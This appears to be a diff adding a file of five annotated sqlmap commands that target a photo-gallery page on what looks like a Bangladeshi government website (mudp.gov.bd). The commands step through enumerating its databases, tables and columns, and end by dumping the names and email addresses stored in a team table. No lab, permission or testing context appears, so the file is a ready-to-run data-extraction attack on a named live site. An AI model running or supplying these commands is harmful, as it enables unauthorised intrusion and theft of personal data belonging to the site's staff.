@@ -1,0 +1,18 @@
+#COMMAND 1
+sqlmap -u http://www.mudp.gov.bd/photo-gallery.php?id=18 --dbs   #Shows the databases of the given website
+
+#COMMAND 2
+sqlmap -u http://www.mudp.gov.bd/photo-gallery.php?id=18 -D mudpgov_database --tables     # Dsiplays the tables of data_base mudpgov_database
+
+#COMMAND 3
+sqlmap -u http://www.mudp.gov.bd/photo-gallery.php?id=18 -D mudpgov_database -T tbl_team --columns #Displays the columns within the table of tbl_team
+
+#COMMAND 4
+sqlmap -u http://www.mudp.gov.bd/photo-gallery.php?id=18 -D mudpgov_database -T tbl_team -C name --dump    #Displays all the data within the column of name
+
+#COMMAND 5
+sqlmap -u http://www.mudp.gov.bd/photo-gallery.php?id=18 -D mudpgov_database -T tbl_team -C email --dump   #Displays the emails 
+
+
+
+
